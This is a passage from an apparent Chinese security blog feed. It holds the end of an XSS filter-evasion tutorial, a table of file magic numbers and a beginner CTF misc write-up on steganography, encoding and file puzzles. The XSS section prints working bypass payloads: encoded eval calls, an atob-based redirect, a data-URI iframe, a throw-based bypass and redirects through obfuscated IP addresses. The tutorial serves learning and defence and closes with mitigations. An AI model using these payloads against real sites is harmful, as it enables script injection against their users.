class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>八进制</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>base64绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤双引号单引号"><a class="markdownIt-Anchor" href="#过滤双引号单引号"></a> 过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</span><br></pre></td></tr></table></figure><p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p><h2 id="过滤括号"><a class="markdownIt-Anchor" href="#过滤括号"></a> 过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤url地址"><a class="markdownIt-Anchor" href="#过滤url地址"></a> 过滤url地址</h2><h3 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码"></a> 使用url编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure><h3 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip"></a> 使用IP</h3><p><code>1.十进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure><p><code>2.八进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure><p><code>3.hex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure><p>4.html标签中用<code>//</code>可以代替<code>http://</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure><p>5.使用<code>\\</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure><p>Windows下<br><img src="/images/94-1.gif" alt></p><p>Linux下<img src="/images/94-2.gif" alt><br>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure><h1 id="如何防止xss"><a class="markdownIt-Anchor" href="#如何防止xss"></a> 如何防止xss</h1><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; ' /</code>等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度限制</li></ul><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">很全的xss总结</a><br><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简述&quot;&gt;&lt;/a&gt; 简述&lt;/h1&gt;
&lt;p&gt;XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>各种文件的文件头和文件尾总结</title>
    <link href="https://muzibing.github.io/2020/02/09/2020.02.09%EF%BC%8892%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/09/2020.02.09（92）/</id>
    <published>2020-02-08T16:00:00.000Z</published>
    <updated>2020-02-09T08:51:27.251Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th style="text-align:center">文件类型</th><th style="text-align:center">文件头</th><th style="text-align:center">文件尾</th></tr></thead><tbody><tr><td style="text-align:center"><strong><font color="brown">JPEG</font></strong></td><td style="text-align:center">FFD8FF</td><td style="text-align:center">FF D9</td></tr><tr><td style="text-align:center"><strong><font color="brown">PNG (png)</font></strong></td><td style="text-align:center">89504E47</td><td style="text-align:center">AE 42 60 82</td></tr><tr><td style="text-align:center"><strong><font color="brown">GIF (gif)</font></strong></td><td style="text-align:center">47494638</td><td style="text-align:center">00 3B</td></tr><tr><td style="text-align:center"><strong><font color="brown">ZIP Archive (zip)</font></strong></td><td style="text-align:center">504B0304</td><td style="text-align:center">50 4B</td></tr><tr><td style="text-align:center"><strong><font color="brown">TIFF (tif)</font></strong></td><td style="text-align:center">49492A00</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Bitmap (bmp)</td><td style="text-align:center">424D</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">CAD (dwg)</td><td style="text-align:center">41433130</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Adobe Photoshop (psd)</td><td style="text-align:center">38425053</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Rich Text Format (rtf)</td><td style="text-align:center">7B5C727466</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">XML (xml)</font></strong></td><td style="text-align:center">3C3F786D6C</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">HTML (html)</font></strong></td><td style="text-align:center">68746D6C3E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">Winhex：3C 21 44 4F 43 54 59 50 45 20 68 74 6D 6C 3E</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Email [thorough only] (eml)</td><td style="text-align:center">44656C69766572792D646174653A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook Express (dbx)</td><td style="text-align:center">CFAD12FEC5FD746F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook (pst)</td><td style="text-align:center">2142444E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">MS Word/Excel (xls.or.doc)</font></strong></td><td style="text-align:center">D0CF11E0</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MS Access (mdb)</td><td style="text-align:center">5374616E64617264204A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">WordPerfect (wpd)</td><td style="text-align:center">FF575043</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">Adobe Acrobat (pdf)</font></strong></td><td style="text-align:center">255044462D312E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Quicken (qdf)</td><td style="text-align:center">AC9EBD8F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Password (pwl)</td><td style="text-align:center">E3828596</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">RAR Archive (rar)</td><td style="text-align:center">52617221</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Wave (wav)</font></strong></td><td style="text-align:center">57415645</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">AVI (avi)</font></strong></td><td style="text-align:center">41564920</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Audio (ram)</td><td style="text-align:center">2E7261FD</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Media (rm)</td><td style="text-align:center">2E524D46</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Quicktime (mov)</font></strong></td><td style="text-align:center">6D6F6F76</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Media (asf)</td><td style="text-align:center">3026B2758E66CF11</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MIDI (mid)</td><td style="text-align:center">4D546864</td><td style="text-align:center">——</td></tr></tbody></table><p>附件：<a href="http://pan.baidu.com/s/1c3raQM" target="_blank" rel="noopener">文件格式分析器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件类型&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件头&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件尾&lt;/th&gt;
&lt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【WP】XCFT misc新手阶段</title>
    <link href="https://muzibing.github.io/2020/01/30/2020.01.30%EF%BC%8891%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/01/30/2020.01.30（91）/</id>
    <published>2020-01-29T16:00:00.000Z</published>
    <updated>2020-02-09T08:10:32.893Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-pdffont"><a class="markdownIt-Anchor" href="#font-color-brown一-pdffont"></a> <font color="brown">一、PDF</font></h3><h4 id="font-color-navy1基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font"></a> <font color="navy">1.基础知识</font></h4><blockquote><p>无</p></blockquote><h4 id="font-color-navy2题目要求font"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-1.jpg" alt></p><h4 id="font-color-navy3做题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font"></a> <font color="navy">3.做题步骤</font></h4><blockquote><p>直接 pdf 转换为 word （<a href="https://lightpdf.com/pdf-to-word" target="_blank" rel="noopener">转换工具点击这里</a>），然后将 word 中的图片进行移动，会发现图片下的 flag。</p></blockquote><h3 id="font-color-brown二-如来十三掌font"><a class="markdownIt-Anchor" href="#font-color-brown二-如来十三掌font"></a> <font color="brown">二、如来十三掌</font></h3><h4 id="font-color-navy1基础知识font-2"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-2"></a> <font color="navy">1.基础知识</font></h4><blockquote><ol><li><strong>与佛论禅</strong>算法的原理和本质</li><li>ROT-13 加密解密：其本质就是凯撒密码的密钥为 13 （平移13个字符）</li></ol></blockquote><h4 id="font-color-navy2题目要求font-2"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-2"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-2.png" alt></p><h4 id="font-color-navy3做题步骤font-2"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-2"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，得到一个 word 文件，打开该文档，发现里面的内容如下：</p><p><img src="/images/91-3.jpg" alt></p></li><li><p>将文字放到“与佛论禅”破解网站里面进行翻译，如下图：</p><p><img src="/images/91-4.jpg" alt></p></li><li><p>根据题目“如来十三掌”的题目提示，我们用 rot-13 进行解密，脚本代码如下：</p><p><img src="/images/91-5.jpg" alt></p></li><li><p>运行脚本，得到对应的密文：</p><p><img src="/images/91-6.jpg" alt></p></li><li><p>但是我们从得到的结果中不能得到什么结果，查了查，发现还要经过 base64 解码后才能得到 flag：</p><p><img src="/images/91-7.jpg" alt></p></li></ol></blockquote><h3 id="font-color-brown三-give-you-flagfont"><a class="markdownIt-Anchor" href="#font-color-brown三-give-you-flagfont"></a> <font color="brown">三、give you flag</font></h3><h4 id="font-color-navy1基础知识font-3"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-3"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><font color="orange">二维码的原理</font></p><ul><li><a href="http://blog.sae.sina.com.cn/archives/1139" target="_blank" rel="noopener">http://blog.sae.sina.com.cn/archives/1139</a></li><li><a href="https://blog.csdn.net/weiwei9363/article/details/81112795" target="_blank" rel="noopener">https://blog.csdn.net/weiwei9363/article/details/81112795</a></li><li><a href="https://blog.csdn.net/u012611878/article/details/53167009" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/53167009</a></li></ul></blockquote><h4 id="font-color-navy2题目要求font-3"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-3"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-8.jpg" alt></p><h4 id="font-color-navy3做题步骤font-3"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-3"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现是一张格式为 gif 的图片，在图片最后会看到一个类似于二维码的图片，但是出现的时间太短了，无法截图</p><p><img src="/images/91-9.jpg" alt></p></li><li><p>那怎么办呢？一个字，“干”就完事了！写脚本，将这个 gif 动图一帧一帧的分离出来，说写咱就写！</p><p><img src="/images/91-10.jpg" alt></p></li><li><p>运行脚本就能得到 gif 每一帧的图片，其中红框标的的图片（名字为 49.jpg）的就是我们要得到的图片</p><p><img src="/images/91-11.jpg" alt></p></li><li><p>打开图片后，发现这并不是一个完整的二维码，那么这里就需要<font color="navy">“基础知识”</font>中所给连接的知识了。在查过相关资料后，发现得到的“残二维码”缺少三个定位图形，下面用 PS 将这三个定位图形加上，得到如下的图片：</p><p><img src="/images/91-12.png" alt></p></li><li><p>打开微信扫描二维码，得到 flag</p></li></ol></blockquote><h3 id="font-color-brown四-坚持-60-sfont"><a class="markdownIt-Anchor" href="#font-color-brown四-坚持-60-sfont"></a> <font color="brown">四、坚持 60 s</font></h3><h4 id="font-color-navy1基础知识font-4"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-4"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>java 的逆向</strong>：JD — GUI</p></blockquote><h4 id="font-color-navy2题目要求font-4"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-4"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-13.jpg" alt></p><h4 id="font-color-navy3做题步骤font-4"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-4"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，发现是一个 java 程序包，运行该程序（前提电脑要有 java 运行环境），如下图：</p><p><img src="/images/91-14.jpg" alt></p></li><li><p>开始玩这个游戏，发现自己怎么也坚持不住 60s，无奈只能对该程序进行逆向（我用的是 JD - GUI），在逆向的结果中搜索“flag”，发现在“PlaneGameFrame.class”中有该结果，于是打开该文件，得到如下结果：</p><p><img src="/images/91-15.jpg" alt></p></li><li><p>发现 flag 中的好像进行了 base64 加密，于是用 python 进行解密，如下：</p><p><img src="/images/91-16.jpg" alt></p></li><li><p>提交 flag ，回答正确。</p></li></ol></blockquote><h3 id="font-color-brown五-giffont"><a class="markdownIt-Anchor" href="#font-color-brown五-giffont"></a> <font color="brown">五、gif</font></h3><h4 id="font-color-navy1基础知识font-5"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-5"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>python 的 <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">os</a> 和 <a href="https://pillow.readthedocs.io/en/stable/" target="_blank" rel="noopener">Pillow</a> 模块</strong></p></blockquote><h4 id="font-color-navy2题目要求font-5"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-5"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-17.jpg" alt></p><h4 id="font-color-navy3解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，解压压缩包，打开 gif 文件夹，发现该文件夹里面由下面一系列图片构成：</p><p><img src="/images/91-18.jpg" alt></p></li><li><p>这些图片代表什么意思呢？在分析了这些图片之后，得到大概的一个想法：这些图片是只由黑、白两种纯色构成，那么黑白的意思是不是代表 二进制中的1 和 0 呢？本着这个想法，我们开始想办法将这些图片用 1 和 0 代替。PS：因为图片太多，我想着用脚本来识别这些图片，再输出相应的数字，脚本如下：</p><p><img src="/images/91-19.jpg" alt></p></li><li><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-20.jpg" alt></p></li></ol></blockquote><hr>2020-2-2 更新<h3 id="font-color-brown六-掀桌子font"><a class="markdownIt-Anchor" href="#font-color-brown六-掀桌子font"></a> <font color="brown">六、掀桌子</font></h3><h4 id="font-color-navy1基础知识font-6"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-6"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>ASCII 值和字符的对应关系</strong></p></blockquote><h4 id="font-color-navy2题目要求font-6"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-6"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-22.png" alt></p><h4 id="font-color-navy3解题步骤font-2"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-2"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li>打开题目，看到题目中给出一串字符串，但是这和掀桌子有什么关系呢？？？？？？？</li></ol><p>难道只是将这些字符转代表的 ASCII 值转换为对应的字符？？？？？</p><ol start="2"><li>下面查查这些字符有多少吧。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; len(<span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>得到的答案是“118”，正好是偶数，那么两两字符的 ASCII 值正好对应一个字符，说干就干！！</p><ol start="3"><li><p>写出脚本，计算出两两字符的ASCII值，并转换为对应的字符：</p><p><img src="/images/91-23.jpg" alt></p></li><li><p>得到如下的结果：</p><p><img src="/images/91-24.jpg" alt></p></li><li><p>从上面的结果可以看到，得到的 ASCII 值均大于 128，那么我们再减去 128 的基础上，算出他们的字符，代码如下：</p><p><img src="/images/91-25.jpg" alt></p><p>执行修改过的代码，得到如下结果：</p><p><img src="/images/91-26.jpg" alt></p><p>从上图的红圈中可以看到“flag is”说明我们的思路没有错误，那么下面我们只需要提交 flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr} 即可</p></li></ol></blockquote><h3 id="font-color-brown七-simplerarfont隐写题"><a class="markdownIt-Anchor" href="#font-color-brown七-simplerarfont隐写题"></a> <font color="brown">七、SimpleRAR</font>（隐写题）</h3><h4 id="font-color-navy1基础知识font-7"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-7"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>png 在 WinRAR 中的文件头格式</strong>：<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p></blockquote><h4 id="font-color-navy2题目要求font-7"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-7"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-28.jpg" alt></p><h4 id="font-color-navy3解题步骤font-3"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-3"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并解压附件，只得到一个 “flag.txt” 的文件，打开该文件文件，得到如下内容：</p><p><img src="/images/91-29.jpg" alt></p><p>从这个文件里面并没有得到实际的信息，那么下一步的思路是什么呢？</p></li><li><p>查了查相关的 writeup 才知道这个压缩包用 WinRAR 打开，修改一下数据：</p><p><img src="/images/91-27.jpg" alt></p><p>将上述蓝色阴影的 “A” 换成 “4”，然后保存，再将文件进行解压，得到如下的文件：</p><p><img src="/images/91-30.jpg" alt></p></li><li><p>用 WinRAR 打开 secret.png 图片，得到下面的信息：</p><p><img src="/images/91-31.jpg" alt></p><p>通过查阅资料，可以得到文件以“47 49 46 38 39 61”开头的图片格式是 gif 格式</p><p><img src="/images/91-32.jpg" alt></p></li><li><p>将文件后缀名改为 <strong>.gif</strong>，再打开文件但是没有什么反应，于是用 Photoshop 打开该文件，可以看出有两个图层：</p><p><img src="/images/91-33.jpg" alt></p></li><li><p>分别将这两个图层单独保存成两个 png 文件：1.png 和 2.png，再用 StegSolve 分别打开这两个图片，会得到两个图形，如下：</p><p><img src="/images/91-34.jpg" alt></p></li><li><p>将这两个图形合到一起，再增加一个定位图形，会得到一个完整的二维码：</p><p><img src="/images/91-35.png" alt></p></li></ol></blockquote><hr>2020-2-3 更新<h3 id="font-color-brown八-base64stegofont隐写题"><a class="markdownIt-Anchor" href="#font-color-brown八-base64stegofont隐写题"></a> <font color="brown">八、base64Stego</font>（隐写题）</h3><h4 id="font-color-navy1基础知识font-8"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-8"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>base64 的隐写</strong>：</p><ul><li><a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/index.html</a></li><li><a href="https://cltheorem.github.io/2018/10/base64%E9%9A%90%E5%86%99/" target="_blank" rel="noopener">https://cltheorem.github.io/2018/10/base64隐写/</a></li></ul><p><strong>python 的几个方法</strong>:</p><ul><li>zfill 方法</li><li>index 方法</li><li>readlines 方法</li><li>count 方法</li></ul></blockquote><h4 id="font-color-navy2题目要求font-8"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-8"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-36.jpg" alt></p><h4 id="font-color-navy3解题步骤font-4"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-4"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现好多行都是类似于 base64 编码后的数据，于是第一开始的思路是将这些数据 通过自己写的 base64 解码工具进行解码，脚本如下：</p><p><img src="/images/91-37.jpg" alt></p><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-38.jpg" alt></p></li><li><p>通过分析得到的文本，并没有得到想要的 flag，但是得出这是一道隐写题：有关 base64 的隐写题，在查阅而资料后（第一部分的两个链接），写出了如下的脚本：</p><p><img src="/images/91-39.jpg" alt></p><p>运行脚本，得到 flag：</p><p><img src="/images/91-40.jpg" alt></p></li></ol></blockquote><hr>2020-2-4 更新<h3 id="font-color-brown九-ext3font"><a class="markdownIt-Anchor" href="#font-color-brown九-ext3font"></a> <font color="brown">九、ext3</font></h3><h4 id="font-color-navy1基础知识font-9"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-9"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>文件系统的挂载</strong>：</p><p>相关链接：</p><ul><li><a href="https://zh.wikipedia.org/wiki/Mount_(Unix)" target="_blank" rel="noopener">mount 命令</a></li><li><a href="https://www.zhihu.com/question/266907637/answer/315386532" target="_blank" rel="noopener">能否通俗易懂，深入浅出地解释一下linux中的挂载的概念？</a></li><li><a href="https://blog.csdn.net/ljianhui/article/details/8604140" target="_blank" rel="noopener">初窥Linux 之 ext2/ext3文件系统</a></li></ul></blockquote><h4 id="font-color-navy2题目要求font-9"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-9"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-41.jpg" alt></p><h4 id="font-color-navy3解题步骤font-5"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-5"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并查看文件的类型：</p><p><img src="/images/91-42.jpg" alt></p><p>可以看出，这是一个 ext3 文件系统，那么我们应该想到系统挂载</p></li><li><p>这一步我们来将文件进行挂载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;    mount 附件 temp</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><p>我们得到如下的文件：</p><p><img src="/images/91-43.jpg" alt></p><ol start="3"><li><p>这么多文件夹，哪个文件夹里面有 flag 呢？</p><p><img src="/images/91-44.jpg" alt></p><p>从红圈标的内容中可以看出，在 “O7avZhikgKgbF” 文件夹中有一个 flag.txt 文件</p></li><li><p>打开 flag.txt 文件，得到一个base64编码后的数据：“ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=”，进行base64解码，得到如下的结果：</p><p><img src="/images/91-45.jpg" alt></p></li></ol></blockquote><h3 id="font-color-brown十-steganofont"><a class="markdownIt-Anchor" href="#font-color-brown十-steganofont"></a> <font color="brown">十、stegano</font></h3><h4 id="font-color-navy1基础知识font-10"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-10"></a> <font color="navy">1.基础知识</font></h4><blockquote><p><strong>摩斯密码</strong>的基础知识：</p><ul><li><a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%5D(https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81)">摩尔斯电码 wiki</a></li></ul><p><strong>PDF.js 技术</strong></p><ul><li><a href="http://blog.fpliu.com/it/web/front/library/PDF-js" target="_blank" rel="noopener">pdf.js 技术</a></li><li><a href="https://chrome.google.com/webstore/detail/pdf-viewer/oemmndcbldboiebfnladdacbdfmadadm/related" target="_blank" rel="noopener">pdf.js插件下载地址</a></li></ul><p><strong>其他的writeup</strong>：<a href="https://www.jianshu.com/p/f502793c13bb" target="_blank" rel="noopener">https://www.jianshu.com/p/f502793c13bb</a></p></blockquote><h4 id="font-color-navy2题目要求font-10"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-10"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-46.png" alt></p><h4 id="font-color-navy3解题步骤font-6"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-6"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件 “pdf” 文件，用软件打开以后并没有发现有用的信息，用 <font color="red"><strong>pdf.js</strong></font> 技术来打开 pdf 文件：在 console 中输入<code>document.documentElement.textContent</code> ，会得到如下的信息：</p><p><img src="/images/91-47.png" alt></p></li><li><p>将得到的信息复制下来，得到如下的内容：</p><p><img src="/images/91-48.png" alt></p><p>从上图中蓝色阴影由 “A” 和 “B” 组成的信息，再加上不同的间隔，可以看出这可能是摩尔斯密码</p></li><li><p>下面写出脚本，对这些信息进行解密，脚本如下：</p><p><img src="/images/91-49.png" alt></p></li><li><p>运行脚本，得到下面的结果：</p><p><img src="/images/91-50.png" alt></p></li></ol></blockquote><hr>2020-2-5 更新<h3 id="font-color-brown十一-功夫再高也怕菜刀font"><a class="markdownIt-Anchor" href="#font-color-brown十一-功夫再高也怕菜刀font"></a> <font color="brown">十一、功夫再高也怕菜刀</font></h3><h4 id="font-color-navy1基础知识font-11"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-11"></a> <font color="navy">1.基础知识</font></h4><blockquote><ul><li><strong>jpg 图片的文件二进制格式</strong>：<a href="https://blog.csdn.net/STN_LCD/article/details/78629029" target="_blank" rel="noopener">https://blog.csdn.net/STN_LCD/article/details/78629029</a><ul><li>图片文件头格式总结：<a href="https://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwy-kitty/p/3928317.html</a></li></ul></li><li><strong>wireshark 